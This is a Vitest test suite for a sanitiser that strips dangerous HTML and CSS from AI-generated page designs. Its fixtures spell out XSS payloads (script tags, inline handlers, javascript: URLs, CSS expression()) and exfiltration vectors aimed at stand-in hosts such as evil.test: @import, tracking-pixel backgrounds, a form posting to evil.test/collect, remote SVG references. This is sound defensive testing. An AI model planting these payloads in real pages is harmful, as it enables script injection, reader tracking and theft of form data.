import { describe, expect, it } from 'vitest'

import {
  DESIGN_SCOPE,
  designScope,
  sanitiseCss,
  sanitiseHtml,
  sanitisePartialHtml,
} from './sanitise'

/**
 * The sanitiser stands between model output and dangerouslySetInnerHTML, and
 * every design in the product goes through it. It is the one piece of this
 * codebase where a gap is a cross-site scripting hole rather than a layout bug,
 * so the tests are written as attacks rather than as examples.
 */
describe('sanitiseHtml — what it must remove', () => {
  it.each([
    ['a script tag', '<div><script>alert(1)</script></div>', 'alert'],
    ['an inline handler', '<button onclick="alert(1)">Go</button>', 'onclick'],
    ['an error handler on a broken image', '<img src="x" onerror="alert(1)">', 'onerror'],
    ['a javascript: link', '<a href="javascript:alert(1)">Go</a>', 'javascript:'],
    ['an iframe', '<iframe src="https://evil.test"></iframe>', 'iframe'],
    ['an object embed', '<object data="x.swf"></object>', 'object'],
    ['a form\'s action', '<form action="https://evil.test"><input></form>', 'evil.test'],
    ['a base tag', '<base href="https://evil.test">', 'base'],
  ])('removes %s', (_label, input, forbidden) => {
    expect(sanitiseHtml(input).toLowerCase()).not.toContain(forbidden.toLowerCase())
  })

  it('removes a handler however it is cased, since attributes are case-insensitive', () => {
    expect(sanitiseHtml('<div OnClIcK="alert(1)">x</div>')).not.toContain('alert')
  })

  it('removes a handler on an element that is otherwise allowed', () => {
    const html = sanitiseHtml('<section onmouseover="steal()"><p>Copy</p></section>')
    expect(html).not.toContain('steal')
    expect(html).toContain('<p>Copy</p>')
  })

  it('rejects a non-image data URL while keeping inline images', () => {
    expect(sanitiseHtml('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>')).not.toContain(
      'data:text/html',
    )
    expect(sanitiseHtml('<img src="data:image/png;base64,iVBORw0KGgo=">')).toContain(
      'data:image/png',
    )
  })

  it('rejects http, so a design cannot mix content into an https page', () => {
    expect(sanitiseHtml('<img src="http://evil.test/a.png">')).not.toContain('http://')
  })

  it('does not lose the sibling after a removed node', () => {
    // A live NodeList mutated while walking skips elements; this is the case
    // that catches it.
    const html = sanitiseHtml('<div><script>x</script><p>one</p><p>two</p></div>')
    expect(html).toContain('one')
    expect(html).toContain('two')
  })
})

describe('sanitiseHtml — what it must keep', () => {
  it('keeps inline styles, which are the entire design system', () => {
    const html = sanitiseHtml('<div style="display: flex; gap: 24px">x</div>')
    expect(html).toContain('display: flex')
  })

  it('keeps CSS variables, which is how a design references the style guide', () => {
    const html = sanitiseHtml('<div style="color: var(--primary)">x</div>')
    expect(html).toContain('var(--primary)')
  })

  it('keeps an inline SVG icon intact', () => {
    const html = sanitiseHtml(
      '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">' +
        '<path d="M4 12h16" stroke="currentColor" stroke-width="2"/></svg>',
    )
    expect(html).toContain('<path')
    expect(html).toContain('M4 12h16')
    expect(html).toContain('stroke-width')
  })

  it('keeps anchors, relative links and fragments', () => {
    expect(sanitiseHtml('<a href="https://mason.test">x</a>')).toContain('https://mason.test')
    expect(sanitiseHtml('<a href="/pricing">x</a>')).toContain('/pricing')
    expect(sanitiseHtml('<a href="#features">x</a>')).toContain('#features')
  })

  it('keeps accessibility attributes', () => {
    const html = sanitiseHtml('<button aria-label="Close" role="button">x</button>')
    expect(html).toContain('aria-label')
    expect(html).toContain('role')
  })

  it('leaves clean markup byte-identical', () => {
    const clean = '<section style="padding: 40px"><h1>Title</h1><p>Body</p></section>'
    expect(sanitiseHtml(clean)).toBe(clean)
  })
})

describe('sanitisePartialHtml', () => {
  it('closes a tag cut off mid-stream instead of dropping the content', () => {
    const html = sanitisePartialHtml('<section><h1>Half a hea')
    expect(html).toContain('Half a hea')
    expect(html).toContain('</section>')
  })

  it('strips a markdown fence the model opened with', () => {
    expect(sanitisePartialHtml('```html\n<p>Hi</p>')).toBe('<p>Hi</p>')
  })

  it('drops orphan attributes left by a chunk boundary inside a tag', () => {
    // Without this the page renders `style="width:100%">` as visible text
    // across the top of the design.
    const html = sanitisePartialHtml('style="width: 100%; display: flex"><p>Body</p>')
    expect(html).not.toContain('width: 100%')
    expect(html).toContain('<p>Body</p>')
  })

  it('leaves real copy that merely contains an equals sign', () => {
    const html = sanitisePartialHtml('Plans start at 2 = 1 <p>More</p>')
    expect(html).toContain('Plans start at')
  })

  it('still removes scripts in a partial stream', () => {
    expect(sanitisePartialHtml('<div><script>alert(1)')).not.toContain('alert')
  })
})

describe('comments', () => {
  it('drops model commentary, which travels with a shared or exported design', () => {
    const html = sanitiseHtml('<p>Body</p><!-- I was unsure about this section -->')
    expect(html).toBe('<p>Body</p>')
  })

  it('drops a comment nested inside the tree, not only at the top level', () => {
    expect(sanitiseHtml('<div><!-- note --><p>Body</p></div>')).toBe('<div><p>Body</p></div>')
  })
})

/**
 * The stylesheet is what makes a generated design interactive rather than a
 * picture of an interface — an inline style cannot express :hover, :focus or
 * :checked, so without it no control can ever respond.
 *
 * It is also the widest thing the model is allowed to write, so these are
 * written as attacks. Two properties matter: a design can never style anything
 * outside itself, and it can never fetch from anywhere it should not.
 */
const scope = `.${DESIGN_SCOPE}`

describe('sanitiseCss — reach', () => {
  it('confines an ordinary selector to the design', () => {
    expect(sanitiseCss('.card { color: red }')).toBe(`${scope} .card{color: red}`)
  })

  it.each(['body', 'html', ':root'])(
    'retargets %s at the wrapper instead of the real page',
    (root) => {
      // Dropping these would leave the design unpainted — it is how a design
      // states its own page colour — but honouring them would let a generated
      // page restyle the editor around it.
      const css = sanitiseCss(`${root} { background: black }`)
      expect(css).toBe(`${scope}{background: black}`)
      expect(css.startsWith(scope)).toBe(true)
    },
  )

  it('cannot blank the application', () => {
    const css = sanitiseCss('body { display: none }')
    expect(css).not.toMatch(/(^|[^-\w])body\s*\{/)
  })

  it('scopes every selector in a list, not just the first', () => {
    expect(sanitiseCss('.a, .b { color: red }')).toBe(`${scope} .a, ${scope} .b{color: red}`)
  })

  it('scopes rules inside a media query', () => {
    expect(sanitiseCss('@media (max-width: 600px) { .a { color: red } }')).toBe(
      `@media (max-width: 600px){${scope} .a{color: red}}`,
    )
  })

  it('leaves keyframe stops alone, which are not selectors', () => {
    // Scoping these produces `.mason-design 0%`, which matches nothing and
    // silently kills every animation in the design.
    const css = sanitiseCss('@keyframes fade { 0% { opacity: 0 } 100% { opacity: 1 } }')
    expect(css).toContain('@keyframes fade')
    expect(css).not.toContain(`${scope} 0%`)
  })

  it('is not desynchronised by a brace hidden in a comment', () => {
    const css = sanitiseCss('/* } body { display:none */ .a { color: red }')
    expect(css).toBe(`${scope} .a{color: red}`)
  })
})

describe('sanitiseCss — exfiltration', () => {
  it.each([
    ['@import', '@import url("https://evil.test/x.css"); .a { color: red }', 'evil.test'],
    // Tighter than the <img> rule on purpose: a background image is a quiet
    // way to tell a third party every time a shared design is opened.
    ['an https background', '.a { background: url(https://evil.test/pixel.png) }', 'evil.test'],
    ['an http url', '.a { background: url(http://evil.test/p.png) }', 'evil.test'],
    ['legacy expression()', '.a { width: expression(alert(1)) }', 'expression'],
    ['a javascript url', '.a { background: url(javascript:alert(1)) }', 'javascript'],
    ['-moz-binding', '.a { -moz-binding: url(https://evil.test/x.xml) }', 'binding'],
  ])('drops %s', (_label, css, forbidden) => {
    expect(sanitiseCss(css).toLowerCase()).not.toContain(forbidden.toLowerCase())
  })

  it('drops only the offending declaration, keeping the rest of the rule', () => {
    const css = sanitiseCss('.a { color: red; background: url(http://evil.test/p.png); gap: 4px }')
    expect(css).toContain('color: red')
    expect(css).toContain('gap: 4px')
    expect(css).not.toContain('evil.test')
  })

  it('keeps an inline image and the app’s own photo route', () => {
    expect(sanitiseCss('.a { background: url(data:image/png;base64,iVBOR) }')).toContain('data:image/png')
    expect(sanitiseCss('.a { background: url(/api/image/800/600/plant?i=0) }')).toContain('/api/image/')
  })

  it('does not mangle a data URI on the semicolon inside it', () => {
    const css = sanitiseCss('.a { background: url("data:image/svg+xml;utf8,<svg/>"); color: red }')
    expect(css).toContain('data:image/svg+xml;utf8')
    expect(css).toContain('color: red')
  })
})

describe('interactive markup', () => {
  it('keeps a real input typeable', () => {
    const html = sanitiseHtml('<input type="text" id="email" name="email" placeholder="You">')
    expect(html).toContain('type="text"')
    expect(html).toContain('placeholder="You"')
    expect(html).toContain('id="email"')
  })

  it('keeps the label/input pairing that makes a click land', () => {
    const html = sanitiseHtml('<input type="radio" id="m48" name="memory" checked><label for="m48">48GB</label>')
    expect(html).toContain('for="m48"')
    expect(html).toContain('name="memory"')
    expect(html).toContain('checked')
  })

  it('keeps details and summary, which open with no script', () => {
    const html = sanitiseHtml('<details open><summary>More</summary><p>Body</p></details>')
    expect(html).toContain('<details')
    expect(html).toContain('<summary>')
    expect(html).toContain('open')
  })

  it('keeps a class, which is what the stylesheet selects on', () => {
    expect(sanitiseHtml('<div class="opt">x</div>')).toContain('class="opt"')
  })

  it('keeps a select and its options', () => {
    const html = sanitiseHtml('<select name="size"><option value="s" selected>Small</option></select>')
    expect(html).toContain('<select')
    expect(html).toContain('<option')
    expect(html).toContain('selected')
  })

  it('still refuses a handler on an interactive element', () => {
    // Widening the tag list must not widen what can run.
    const html = sanitiseHtml('<button onclick="steal()" onfocus="steal()">Go</button>')
    expect(html).not.toContain('steal')
    expect(html).toContain('<button')
  })

  it('sanitises the stylesheet it now allows through', () => {
    const html = sanitiseHtml('<style>body { display: none } .a:hover { color: red }</style><div class="a">x</div>')
    expect(html).toContain('<style>')
    expect(html).toContain(`${scope} .a:hover`)
    expect(html).not.toMatch(/(^|[^-\w])body\s*\{/)
  })

  it('removes a style element with nothing safe left in it', () => {
    expect(sanitiseHtml('<style>@import url("https://evil.test/x.css");</style>')).not.toContain('<style>')
  })
})

describe('sanitiseCss — idempotence', () => {
  /**
   * A design is sanitised on the way in, edited, serialised back to storage
   * with its stylesheet already scoped, and sanitised again on the next
   * render. Scoping had to be applied exactly once however many times that
   * cycle runs.
   */
  it('does not scope a selector that is already scoped', () => {
    const once = sanitiseCss('.card { color: red }')
    expect(sanitiseCss(once)).toBe(once)
  })

  it('survives many round trips unchanged', () => {
    // Each pass used to add a level: `.mason-design .mason-design .card`
    // needs a wrapper inside a wrapper, and there is only ever one — so the
    // rule matched nothing and the design lost its stylesheet.
    let css = sanitiseCss('.card:hover { color: red }')
    for (let pass = 0; pass < 5; pass += 1) css = sanitiseCss(css)

    expect(css).toBe(`${scope} .card:hover{color: red}`)
    expect(css).not.toContain(`${scope} ${scope}`)
  })

  it('keeps a retargeted root rule stable across passes', () => {
    const once = sanitiseCss('body { background: black }')
    expect(sanitiseCss(once)).toBe(once)
  })

  it('is idempotent inside a media query too', () => {
    const once = sanitiseCss('@media (max-width: 640px) { .nav { display: none } }')
    expect(sanitiseCss(once)).toBe(once)
  })
})


describe('sanitiseCss — the ways out of the scope', () => {
  /**
   * The regression this exists for: prefixing put the scope in front of
   * whatever the selector was, and a selector may begin with a combinator.
   * `.mason-design + nav` is not a rule about the design — it is a rule about
   * whatever the application renders beside it, which is how a generated
   * design could reach the editor's own chrome.
   */
  it.each(['+ nav', '~ .sidebar', '+ *'])('drops the sibling selector %s', (selector) => {
    expect(sanitiseCss(`${selector} { display: none }`)).toBe('')
  })

  it('keeps a child selector, which is still inside the design', () => {
    expect(sanitiseCss('> nav { color: red }')).toBe(`.${DESIGN_SCOPE} > nav{color: red}`)
  })

  it('drops only the escaping half of a selector list', () => {
    expect(sanitiseCss('.card, + nav { color: red }')).toBe(`.${DESIGN_SCOPE} .card{color: red}`)
  })
})

describe('sanitiseCss — at-rules that fetch', () => {
  /**
   * The regression this exists for: keyframes and @font-face bodies were
   * pushed through untouched — correctly, for the stops, which are not
   * selectors — and that made them the one place in a design's stylesheet
   * that could still name a third-party host. Opening a shared design told
   * that host who was reading it.
   */
  it('drops a remote font source but keeps the face', () => {
    const css = sanitiseCss("@font-face { font-family: X; src: url(https://elsewhere.test/f.woff2) }")
    expect(css).toContain('@font-face')
    expect(css).not.toContain('elsewhere.test')
  })

  it('drops a remote fetch inside a keyframe stop, keeping the animation', () => {
    const css = sanitiseCss(
      '@keyframes spin { 0% { transform: rotate(0) } to { background: url(https://elsewhere.test/p.gif) } }',
    )
    expect(css).toContain('@keyframes spin')
    expect(css).toContain('0%{transform: rotate(0)}')
    expect(css).not.toContain('elsewhere.test')
  })

  it('never scopes a keyframe stop, which would kill the animation', () => {
    expect(sanitiseCss('@keyframes fade { from { opacity: 0 } }')).not.toContain(
      `.${DESIGN_SCOPE} from`,
    )
  })

  it('drops a face that has nothing left worth keeping', () => {
    expect(sanitiseCss('@font-face { src: url(https://elsewhere.test/f.woff2) }')).toBe('')
  })
})

describe('the style attribute', () => {
  /**
   * The regression this exists for: `style` was on the allow-list and kept
   * verbatim, so every rule about where a design may fetch from could be
   * skipped by writing the declaration inline instead of in the stylesheet.
   */
  it('drops a remote fetch from an inline style', () => {
    const html = sanitiseHtml('<div style="background: url(https://elsewhere.test/p.gif)">x</div>')
    expect(html).not.toContain('elsewhere.test')
  })

  it('keeps the rest of the declarations around the one it drops', () => {
    const html = sanitiseHtml(
      '<div style="color: red; background: url(https://elsewhere.test/p.gif); padding: 4px">x</div>',
    )
    expect(html).toContain('color: red')
    expect(html).toContain('padding: 4px')
    expect(html).not.toContain('elsewhere.test')
  })

  it('keeps an inline image and the app\'s own image route', () => {
    const html = sanitiseHtml('<div style="background: url(/api/image/photo)">x</div>')
    expect(html).toContain('/api/image/photo')
  })

  it('drops an expression() however it is written', () => {
    const html = sanitiseHtml('<div style="width: expression(alert(1))">x</div>')
    expect(html).not.toContain('expression')
  })
})

describe('one design among many', () => {
  /**
   * The regression this exists for: every design was wrapped in the same
   * class and every stylesheet scoped to it, so the gallery, the dashboard
   * grid and any canvas with two frames on it had each design restyling its
   * neighbours.
   */
  const scope = designScope('k57abc')

  it('confines a design to its own scope when asked', () => {
    expect(sanitiseCss('.card { color: red }', `.${scope}`)).toBe(`.${scope} .card{color: red}`)
  })

  it('re-targets a stylesheet that was stored under the shared scope', () => {
    const stored = sanitiseCss('.card { color: red }')
    expect(sanitiseCss(stored, `.${scope}`)).toBe(`.${scope} .card{color: red}`)
  })

  it('re-targets back again, so nothing is one-way', () => {
    const perDesign = sanitiseCss('.card { color: red }', `.${scope}`)
    expect(sanitiseCss(perDesign)).toBe(`.${DESIGN_SCOPE} .card{color: red}`)
  })

  it('rewrites the stylesheet inside the markup to match', () => {
    const html = sanitiseHtml('<style>.card { color: red }</style><div class="card">x</div>', scope)
    expect(html).toContain(`.${scope} .card`)
    expect(html).not.toContain(`.${DESIGN_SCOPE} .card`)
  })

  it('does not mistake a design\'s own class for a scope', () => {
    expect(sanitiseCss('.mason-designer .card { color: red }')).toBe(
      `.${DESIGN_SCOPE} .mason-designer .card{color: red}`,
    )
  })

  it('falls back to the shared scope rather than an empty one', () => {
    expect(designScope('')).toBe(DESIGN_SCOPE)
    expect(designScope('---')).toBe(DESIGN_SCOPE)
  })
})

describe('what a model writes and the walk deleted', () => {
  /**
   * The regression this exists for: `form` was not on the tag list, and a
   * disallowed element is removed with everything inside it. A newsletter
   * box or a sign-in card written as `<form>`, which is how a model writes
   * one, vanished whole on first paint, with nothing in the layer tree to
   * say it had ever been there.
   */
  it('keeps a form, which a sign-up section is', () => {
    const html = sanitiseHtml(
      '<form><label for="e">Email</label><input id="e" type="email"><button>Join</button></form>',
    )
    expect(html).toContain('<form>')
    expect(html).toContain('<input id="e" type="email">')
    expect(html).toContain('<button>Join</button>')
  })

  it('keeps the form and drops everywhere it could send anything', () => {
    // Widening the tag list must not give a design a way to post.
    const html = sanitiseHtml(
      '<form action="https://evil.test/collect" method="post" enctype="text/plain" onsubmit="steal()"><input name="card"></form>',
    )
    expect(html).toContain('<form>')
    expect(html).not.toContain('action')
    expect(html).not.toContain('method')
    expect(html).not.toContain('enctype')
    expect(html).not.toContain('steal')
  })

  it('keeps a form cut off mid-stream, as the canvas paints it', () => {
    const html = sanitisePartialHtml('<form><label for="e">Email</label><input id="e" type="ema')
    expect(html).toContain('<form>')
    expect(html).toContain('<label for="e">Email</label>')
  })

  it('keeps the inline semantics a landing page is written with', () => {
    const html = sanitiseHtml(
      '<address>1 Main St</address><p>Press <kbd>Cmd</kbd>, <q>quote</q>, by <cite>Someone</cite></p>',
    )
    for (const tag of ['address', 'kbd', 'q', 'cite']) expect(html).toContain(`<${tag}>`)
  })

  it('keeps a picture so its img fallback survives, and still drops its sources', () => {
    const html = sanitiseHtml(
      '<picture><source srcset="https://evil.test/a.png 1x"><img src="/api/image/x" alt=""></picture>',
    )
    expect(html).toContain('<picture>')
    expect(html).toContain('/api/image/x')
    expect(html).not.toContain('<source')
    expect(html).not.toContain('evil.test')
  })
})

describe('icons', () => {
  /**
   * The regression this exists for: `fill-rule` was not on the attribute
   * list. Most icon sets cut the holes in a filled glyph with
   * `fill-rule="evenodd"`, so every ring rendered as a disc and every
   * outlined shape as a blob.
   */
  it('keeps fill-rule so an icon\'s holes stay holes', () => {
    const html = sanitiseHtml(
      '<svg viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 4a6 6 0 110 12 6 6 0 010-12z"/></svg>',
    )
    expect(html).toContain('fill-rule="evenodd"')
    expect(html).toContain('clip-rule="evenodd"')
  })

  it('keeps the paint that shapes a stroke and places a label', () => {
    const html = sanitiseHtml(
      '<svg><circle r="4" stroke-dasharray="4 2" stroke-dashoffset="1" stroke-opacity=".5" fill-opacity=".2"/>' +
        '<text text-anchor="middle" dominant-baseline="central">1</text></svg>',
    )
    for (const attribute of [
      'stroke-dasharray="4 2"',
      'stroke-dashoffset="1"',
      'stroke-opacity=".5"',
      'fill-opacity=".2"',
      'text-anchor="middle"',
      'dominant-baseline="central"',
    ]) {
      expect(html).toContain(attribute)
    }
  })

  it('keeps how a photograph loads', () => {
    const html = sanitiseHtml('<img src="/api/image/x" alt="" loading="lazy" decoding="async">')
    expect(html).toContain('loading="lazy"')
    expect(html).toContain('decoding="async"')
  })

  it('keeps a clip-path that points at the clipPath beside it', () => {
    const html = sanitiseHtml(
      '<svg><defs><clipPath id="clip"><rect width="10" height="10"/></clipPath></defs>' +
        '<g clip-path="url(#clip)"><rect width="20" height="20"/></g></svg>',
    )
    expect(html).toContain('<clipPath id="clip">')
    expect(html).toContain('clip-path="url(#clip)"')
  })

  it('drops a clip-path that points off the page', () => {
    // A presentation attribute is a declaration by another route, and
    // `url(https://…)` here is the request a background image would make.
    const html = sanitiseHtml(
      '<svg><g clip-path="url(https://evil.test/c.svg#clip)" mask="url(http://evil.test/m.svg#m)"><rect/></g></svg>',
    )
    expect(html).not.toContain('evil.test')
    expect(html).toContain('<rect')
  })

  it('keeps a mask, a symbol, a title and a description', () => {
    const html = sanitiseHtml(
      '<svg><title>Search</title><desc>A magnifier</desc>' +
        '<defs><mask id="m"><rect/></mask><symbol id="s"><path d="M0 0"/></symbol></defs>' +
        '<use href="#s" mask="url(#m)"/></svg>',
    )
    for (const fragment of ['<title>Search</title>', '<desc>A magnifier</desc>', '<mask id="m">', '<symbol id="s">', '<use href="#s" mask="url(#m)">']) {
      expect(html).toContain(fragment)
    }
  })

  it('keeps a use that points into its own document, by either spelling', () => {
    const html = sanitiseHtml('<svg><use href="#a"/><use xlink:href="#b"/></svg>')
    expect(html).toContain('href="#a"')
    expect(html).toContain('xlink:href="#b"')
  })

  it('drops a use whose href leaves the document', () => {
    // Same-origin paths are fine for an <img> and not here: a use fetches a
    // whole SVG document and clones what it finds, none of which has been
    // through this walk.
    const html = sanitiseHtml(
      '<svg><use href="https://evil.test/sprite.svg#icon"/><use xlink:href="/sprite.svg#icon"/>' +
        '<use href="data:image/svg+xml,<svg/>#x"/></svg>',
    )
    expect(html).not.toContain('evil.test')
    expect(html).not.toContain('sprite.svg')
    expect(html).not.toContain('data:')
    expect(html).toContain('<use>')
  })

  it('does not let the html title element in through the svg one', () => {
    expect(sanitiseHtml('<title>Owned</title><p>Body</p>')).toBe('<p>Body</p>')
  })

  it('still drops onload on an svg', () => {
    // Widening the tag and attribute lists must not widen what can run.
    const html = sanitiseHtml(
      '<svg onload="steal()"><use href="#a" onclick="steal()"/><path d="M0 0" onmouseover="steal()"/></svg>',
    )
    expect(html).not.toContain('steal')
    expect(html).toContain('<path d="M0 0">')
  })
})
